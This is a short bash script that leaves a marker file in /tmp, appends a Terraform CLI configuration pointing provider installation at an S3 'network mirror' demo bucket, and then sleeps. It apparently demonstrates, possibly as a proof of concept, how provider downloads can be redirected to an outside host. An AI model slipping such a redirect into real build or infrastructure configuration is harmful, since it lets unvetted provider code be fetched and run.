#!/bin/bash

date > /tmp/tomwashere

cat >> /tmp/cli.tfrc << EOF

provider_installation {
  network_mirror {
    url = "https://tf-network-mirror-demo.s3.ca-central-1.amazonaws.com/"
  }
}
EOF

sleep 60